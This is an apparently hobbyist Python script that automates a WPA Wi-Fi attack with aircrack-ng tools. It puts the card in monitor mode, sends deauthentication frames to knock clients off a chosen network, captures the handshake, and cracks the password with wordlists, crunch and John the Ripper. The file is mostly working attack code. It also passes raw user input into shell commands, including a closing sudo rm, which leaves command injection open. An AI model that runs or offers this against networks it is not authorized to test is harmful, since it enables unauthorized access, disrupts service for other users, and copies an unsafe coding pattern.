import os
from rich import print
import subprocess
import re
from time import sleep

# Display banner
def display_banner():
    banner = """
[bold red]__        __ ___ _ _           _____             
\ \      / /| __| (_) _ _     |_   _|_ _  _ __   
 \ \ /\ / / | _|| || '_| |   | || || ' \| '  \  
  \ V  V /  |___|_||_| |_|    |_||_||_||_|_|_|[/bold red]
[bold blue]              By: N V R K SAI KAMESH SHARMA[bold blue]
"""
    print(banner)
    sleep(5)

# Function to run commands with error handling
def run_command(command):
    print(f"[bold green]Running: {command}[/bold green]")
    result = os.system(command)
    if result != 0:
        print(f"[bold red]Error executing: {command}[/bold red]")
        return False
    return True

# Validate BSSID format
def is_valid_bssid(bssid):
    return bool(re.match(r'([0-9a-fA-F]{2}:){5}([0-9a-fA-F]{2})$', bssid))

# Validate channel
def is_valid_channel(channel):
    return channel.isdigit() and 1 <= int(channel) <= 14

# Activate monitor mode
def activate_monitor_mode(interface):
    print(f"[bold blue]Activating monitor mode on interface {interface}...[bold blue]")
    return run_command(f"sudo airmon-ng start {interface}")

# Deactivate monitor mode
def deactivate_monitor_mode(interface):
    print(f"[bold blue]Deactivating monitor mode on interface {interface}...[bold blue]")
    return run_command(f"sudo airmon-ng stop {interface}")

# Scan networks using airodump-ng
def scan_networks(interface):
    print(f"[bold green]Scanning networks on interface {interface}...[bold green]")
    return run_command(f"sudo airodump-ng {interface}")

# Change channel function
def change_channel(interface, channel):
    print(f"[bold yellow]Changing channel to {channel} on interface {interface}...[bold yellow]")
    return run_command(f"sudo iw dev {interface} set channel {channel}")

# Capture handshake for a specific network
def capture_handshake(interface, bssid, channel, file):
    if not change_channel(interface, channel):  # Change channel before capturing
        return False
    print(f"[bold yellow]Capturing handshake on interface {interface} for BSSID {bssid} on channel {channel}...[bold yellow]")
    return run_command(f"xterm -hold -e 'sudo airodump-ng -c {channel} --bssid {bssid} {interface} -w {file}' | xterm -fg red -e 'sudo aireplay-ng -0 20 -a {bssid} {interface}'")

# Crack with a password list
def crack_handshake_with_passwordlist(handshake_file, bssid, passwordlist):
    print(f"[bold yellow]Cracking handshake with password list {passwordlist} on handshake file {handshake_file}...[bold yellow]")
    return run_command(f"xterm -hold -fg blue -e 'sudo aircrack-ng -w {passwordlist} -b {bssid} {handshake_file}-01.cap'")

# Generate password list with crunch
def generate_password_list(min_len, max_len, charset, output_file):
    print(f"[bold green]Generating password list with crunch...[bold green]")
    return run_command(f"crunch {min_len} {max_len} {charset} -o {output_file}")

# Advanced cracking with John the Ripper
def john_advanced_crack(handshake_file):
    print(f"[bold cyan]Preparing John the Ripper session on {handshake_file}...[bold cyan]")
    if not run_command(f"hcxpcaptool -z john_hashes.txt {handshake_file}-01.cap"):
        return False
    print(f"[bold yellow]Cracking with John the Ripper...[/bold yellow]")
    return run_command(f"john --wordlist=crunch_wordlist.txt john_hashes.txt")

# Main usage
display_banner()

interface = "wlan0"  # Replace 'wlan0' with your interface name
moninterface = "wlan0mon"
if not activate_monitor_mode(interface):
    exit()

if not scan_networks("wlan0mon"):  # Replace 'wlan0mon' with the monitor interface name
    deactivate_monitor_mode(interface)
    exit()

# Prompt user to enter the target BSSID and channel after scanning
try:
    bssid = input("Enter the BSSID of the target network: ")
    if not is_valid_bssid(bssid):
        print("[bold red]Invalid BSSID format.[/bold red]")
        deactivate_monitor_mode(interface)
        exit()
    
    channel = input("Enter the channel of the target network: ")
    if not is_valid_channel(channel):
        print("[bold red]Invalid channel number.[/bold red]")
        deactivate_monitor_mode(moninterface)
        exit()

    file = input("File to save handshake: ")
except KeyboardInterrupt:
    deactivate_monitor_mode(moninterface)
    exit()

if not capture_handshake("wlan0mon", bssid, channel, file):  # Replace 'wlan0mon' with your monitor mode interface name
    deactivate_monitor_mode(moninterface)
    exit()

# Prompt for cracking method
try:
    print("[bold blue]If you want to crack with a password list, press 'p'. If you want to crack with advanced methods, press 'a'. Anything else will abort the cracking mission.")
    prompt = input("")
    if prompt.lower() == 'p':
        password_list = input("Enter the path to the password list (e.g., /usr/share/wordlists/...): ")
        if not crack_handshake_with_passwordlist(file, bssid, password_list):  # Specify the correct capture file name
            deactivate_monitor_mode(moninterface)
            exit()
    elif prompt.lower() == 'a':
        print("[bold green]Generating password list using crunch...[/bold green]")
        min_len = input("Enter minimum password length: ")
        max_len = input("Enter maximum password length: ")
        charset = input("Enter character set (e.g., abcdefghijklmnopqrstuvwxyz1234567890): ")
        if not generate_password_list(min_len, max_len, charset, "crunch_wordlist.txt"):
            deactivate_monitor_mode(moninterface)
            exit()
        if not john_advanced_crack(file):  # Specify the correct capture file name
            deactivate_monitor_mode(moninterface)
            exit()
    else:
        print("[bold red]Aborting cracking mission.[/bold red]")
        deactivate_monitor_mode(moninterface)
        exit()
except KeyboardInterrupt:
    print("[bold red]Aborting cracking mission.[/bold red]")
finally:
    deactivate_monitor_mode(moninterface)  # Deactivate monitor mode once done
    os.system(f"sudo rm {file}-01.cap {file}-01.csv {file}-01.kismet.csv {file}-01.kismet.netxml {file}-01.log.csv")
